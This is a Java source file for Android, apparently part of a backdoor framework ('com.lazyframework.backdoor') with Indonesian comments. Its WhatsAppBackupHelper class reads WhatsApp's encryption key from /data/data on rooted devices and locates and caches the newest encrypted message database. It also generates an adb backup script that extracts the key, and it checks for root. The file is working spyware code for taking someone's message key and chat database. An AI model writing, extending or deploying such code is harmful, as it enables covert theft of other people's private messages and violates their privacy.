package com.lazyframework.backdoor;

import android.content.Context;
import android.os.Build;
import android.util.Log;
import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;
import org.json.JSONObject;  // ← TAMBAHKAN INI
public class WhatsAppBackupHelper {
    private static final String TAG = "LazyFramework";
    private static final String WHATSAPP_PACKAGE = "com.whatsapp";
    private static final String WHATSAPP_BUSINESS_PACKAGE = "com.whatsapp.w4b";
    
    private Context context;
    private String packageName;
    
    public WhatsAppBackupHelper(Context context, boolean isBusiness) {
        this.context = context;
        this.packageName = isBusiness ? WHATSAPP_BUSINESS_PACKAGE : WHATSAPP_PACKAGE;
    }
    
    /**
     * Mencoba mengambil file key dari /data/data/
     * Hanya berhasil jika perangkat di-root atau menggunakan metode backup
     */
    public byte[] getKeyFile() {
        try {
            // Coba baca langsung (membutuhkan root)
            String keyPath = "/data/data/" + packageName + "/files/key";
            File keyFile = new File(keyPath);
            if (keyFile.exists() && keyFile.canRead()) {
                FileInputStream fis = new FileInputStream(keyFile);
                byte[] keyData = new byte[(int) keyFile.length()];
                fis.read(keyData);
                fis.close();
                Log.d(TAG, "✅ Key file read: " + keyData.length + " bytes");
                return keyData;
            } else {
                Log.w(TAG, "⚠️ Cannot read key file directly (need root)");
                return null;
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading key: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * Mendapatkan path database WhatsApp
     */
    public String getDatabasePath() {
        // Android 10+ (API 29) menggunakan lokasi baru
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            String basePath = "/storage/emulated/0/Android/media/" + packageName + "/WhatsApp/Databases/";
            File dir = new File(basePath);
            if (dir.exists()) {
                return basePath;
            }
        }
        
        // Lokasi lama (Android 9 ke bawah)
        String oldPath = "/sdcard/WhatsApp/Databases/";
        File oldDir = new File(oldPath);
        if (oldDir.exists()) {
            return oldPath;
        }
        
        // Fallback: coba cari di external storage
        String fallbackPath = context.getExternalFilesDir(null) + "/../Databases/";
        File fallbackDir = new File(fallbackPath);
        if (fallbackDir.exists()) {
            return fallbackPath;
        }
        
        return null;
    }
    
    /**
     * Mendapatkan file database terbaru
     */
    public String getLatestDatabaseFile() {
        String dbPath = getDatabasePath();
        if (dbPath == null) {
            Log.w(TAG, "⚠️ Database path not found");
            return null;
        }
        
        File dbDir = new File(dbPath);
        if (!dbDir.exists() || !dbDir.isDirectory()) {
            return null;
        }
        
        // Cari file database dengan versi terbaru
        String[] files = dbDir.list();
        if (files == null) return null;
        
        String latestFile = null;
        long latestTime = 0;
        
        for (String file : files) {
            if (file.startsWith("msgstore") && file.contains(".crypt")) {
                File f = new File(dbDir, file);
                if (f.lastModified() > latestTime) {
                    latestTime = f.lastModified();
                    latestFile = file;
                }
            }
        }
        
        if (latestFile != null) {
            Log.d(TAG, "📁 Latest database: " + latestFile);
            return dbPath + latestFile;
        }
        
        return null;
    }
    
    /**
     * Membuat backup WhatsApp (metode non-root via adb backup)
     * Ini akan meminta user untuk melakukan backup manual
     */
    public String createBackupScript() {
        String script = "#!/bin/bash\n";
        script += "# WhatsApp Backup Script\n";
        script += "# Jalankan di PC dengan ADB\n\n";
        script += "echo '📱 Creating WhatsApp backup...'\n";
        script += "adb backup -f whatsapp_backup.ab -apk -noshared " + packageName + "\n";
        script += "echo '✅ Backup created: whatsapp_backup.ab'\n\n";
        script += "# Extract backup menggunakan abe.jar\n";
        script += "# java -jar abe.jar unpack whatsapp_backup.ab whatsapp_backup.tar\n\n";
        script += "# Extract key dari tar\n";
        script += "# tar -xf whatsapp_backup.tar apps/" + packageName + "/ef/ --wildcards --strip-components=5\n";
        script += "# mv ef/ key\n";
        
        return script;
    }
    
    /**
     * Mencoba mendapatkan key melalui berbagai metode
     */
    public String getKeyViaBackup() {
        // Metode 1: Baca langsung
        byte[] keyData = getKeyFile();
        if (keyData != null) {
            return "key_direct_" + System.currentTimeMillis() + ".key";
        }
        
        // Metode 2: Buat script untuk user
        String scriptPath = context.getFilesDir() + "/backup_script.sh";
        try {
            FileWriter fw = new FileWriter(scriptPath);
            fw.write(createBackupScript());
            fw.close();
            Log.d(TAG, "📝 Backup script created: " + scriptPath);
            return scriptPath;
        } catch (Exception e) {
            Log.e(TAG, "❌ Error creating script: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * Mengecek apakah ada file key yang tersimpan di cache
     */
    public byte[] getCachedKey() {
        try {
            File cacheFile = new File(context.getCacheDir(), "whatsapp_key.key");
            if (cacheFile.exists()) {
                FileInputStream fis = new FileInputStream(cacheFile);
                byte[] keyData = new byte[(int) cacheFile.length()];
                fis.read(keyData);
                fis.close();
                return keyData;
            }
        } catch (Exception e) {
            Log.e(TAG, "Cache read error: " + e.getMessage());
        }
        return null;
    }
    
    /**
     * Menyimpan key ke cache
     */
    public void cacheKey(byte[] keyData) {
        try {
            File cacheFile = new File(context.getCacheDir(), "whatsapp_key.key");
            FileOutputStream fos = new FileOutputStream(cacheFile);
            fos.write(keyData);
            fos.close();
            Log.d(TAG, "💾 Key cached");
        } catch (Exception e) {
            Log.e(TAG, "Cache write error: " + e.getMessage());
        }
    }
    
    /**
     * Mendapatkan informasi WhatsApp
     */
    public String getWhatsAppInfo() {
        try {
            android.content.pm.PackageManager pm = context.getPackageManager();
            android.content.pm.PackageInfo info = pm.getPackageInfo(packageName, 0);
            
            String dbPath = getDatabasePath();
            String latestDb = getLatestDatabaseFile();
            
            JSONObject result = new JSONObject();
            result.put("package", packageName);
            result.put("version", info.versionName);
            result.put("version_code", info.versionCode);
            result.put("database_path", dbPath != null ? dbPath : "Not found");
            result.put("latest_database", latestDb != null ? latestDb : "Not found");
            result.put("has_key", getKeyFile() != null);
            result.put("is_rooted", checkRoot());
            
            // Cek metode backup
            String backupScript = getKeyViaBackup();
            result.put("backup_script", backupScript != null ? backupScript : "Not created");
            
            return result.toString();
        } catch (Exception e) {
            return "{\"error\":\"" + e.getMessage() + "\"}";
        }
    }
    
    /**
     * Cek apakah perangkat di-root
     */
    private boolean checkRoot() {
        try {
            File file = new File("/system/app/Superuser.apk");
            if (file.exists()) return true;
            
            Process process = Runtime.getRuntime().exec("which su");
            BufferedReader in = new BufferedReader(new InputStreamReader(process.getInputStream()));
            if (in.readLine() != null) return true;
        } catch (Exception e) {
            return false;
        }
        return false;
    }
}
